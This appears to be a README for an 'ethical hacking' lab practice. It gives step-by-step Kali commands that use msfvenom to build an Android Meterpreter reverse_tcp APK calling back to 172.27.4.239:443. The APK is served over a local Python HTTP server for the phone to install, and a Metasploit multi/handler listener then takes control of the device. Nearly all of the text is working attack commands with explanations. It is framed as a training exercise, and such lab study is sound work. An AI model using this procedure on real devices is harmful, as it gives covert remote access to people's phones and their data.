# Ethical-Hacking

In these practices we will put in the form of code and a step-by-step explanation of each practice.

## First Practice

### msfvenom apk

In this first practice we will use msfvenom to create an application which will aim to control an Android device for ethical purposes.


#### Escalate privileges
**┌──(kali㉿CarlosSantos)-[~]**
**└─$** `sudo -s`


#### We check what our hostname is
**┌──(root㉿CarlosSantos)-[/home/kali]**
**└─#** `hostname -I`



 >[!INFO]
 >
 >If you do not have kali metasploit installed on your system, you must install it `sudo apt install metasploit-framework`


#### We use msfvenom
**┌──(root㉿CarlosSantos)-[/home/kali]**
**└─#** `msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.4.239 LPORT=443 -o practice.apk`

1. *msfvenom: Es el nombre del comando que invoca la herramienta msfvenom. **-p***

1. *`android/meterpreter/reverse_tcp`: Specifies the payload to use in the APK file. In this case, the `android/meterpreter/reverse_tcp` payload is used, which allows establishing a reverse TCP connection on Android devices.*

1. *LHOST=172.27.4.239: Specifies the IP address of the host (the machine running the server) to which the Metasploit payload will connect. In this case, the IP address is 172.27.4.239*

1. *LPORT=443: Specifies the port number on the host that the Metasploit payload will connect to. In this case, the port is 443, which is commonly used for secure HTTPS connections.*

1. **-o** *practice.apk: Especifica el nombre del archivo de salida, es decir, el nombre del archivo APK malicioso que se generará. En este caso, el archivo se llamará practice.apk.*


#### We create a local server with python3
**┌──(root㉿CarlosSantos)-[/home/kali]**
**└─#** `python3 -m http.server 80`



   >[!IMPORTANT]
   >
   >Remember to connect to the server with your android, in this case they must be on the same network since the server is local, just like our attack.
   >Install practice.apk in your android


#### Running the msfconsole
**┌──(root㉿CarlosSantos)-[/home/kali]**
**└─#** `msfconsole`

1. *Running the msfconsole command will open an interactive console where you can use a wide range of Metasploit functionality. From this console, you can load and configure modules, select and configure exploits, scan and enumerate systems, launch attacks, and perform penetration testing on networks and systems.*

#### Running the /multi/handler
**msf6 >**  `use /multi/handler`
**[*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) >**

1. *This command is used to select the multi/handler module, which is a special module in Metasploit that is used to handle reverse shell or meterpreter connections. That is, it is the module that listens to and handles incoming connections from payloads that have been executed on the target systems.*


#### set payload
**msf6 exploit(multi/handler) >** `set Payload android/meterpreter reverse_tcp`
**payload => android/meterpreter/reverse_tcp**

1. *The set payload android/meterpreter/reverse_tcp command is used in the msfconsole command line interface of the Metasploit Framework.*

**This command configures the payload to be used in the currently selected module. In this case, the payload is android/meterpreter/reverse_tcp.*

**Here is the meaning of each part of the payload:*

**android: Indicates that the payload is designed for Android systems.*
**meterpreter: It is an advanced and versatile Metasploit shell that provides a number of features, such as the ability to migrate between different processes, load scripts and extensions at runtime, and capture keyboard and screen input.reverse_tcp: This is a type of connection in which the target machine establishes the connection back to the attacker (i.e. "reverse"), which can be useful for bypassing certain types of firewalls.*


#### show options
**msf6 exploit(multi/handler) >** `show options`

*Module options (exploit/multi/handler):*

   **Name**  **Current** **Setting**  **Required**  **Description**
   ----  ---------------  --------  -----------


**Payload options (android/meterpreter/reverse_tcp):**

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface
                                      may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.



* *This command displays the options available for the currently selected module. These options can include details such as the IP address and port of the target host, the IP address and port of the local host, credentials to authenticate to the target host, and more.*


#### listening mode
**msf6 exploit(multi/handler) >** `set LHOST 172.27.4.239`
**LHOST => 172.27.4.239**
**msf6 exploit(multi/handler) >** `set LPORT 443`
**LPORT => 443**
**msf6 exploit(multi/handler) >** `run`

>[!IMPORTANT]
>
>Until the Android enters the application, nothing will happen after it enters, we are in listening mode and through that action we will enter the phone



* set LHOST 172.27.4.239: This command sets the LHOST (Local HOST) option, which is the IP address of the local machine (that is, the attacker's machine). This will be the IP address that the target system will try to connect to. In this case, it is set to 172.27.4.239.

* set LPORT 443: This command sets the LPORT (Local PORT) option, which is the port on the local machine that will listen for incoming connections from the target system. In this case, it is set to 443, which is commonly used for secure HTTPS connections.

* run: This command runs the exploit module with the configured options. In this case, the multi/handler module will start listening for incoming connections on the specified IP address and port.

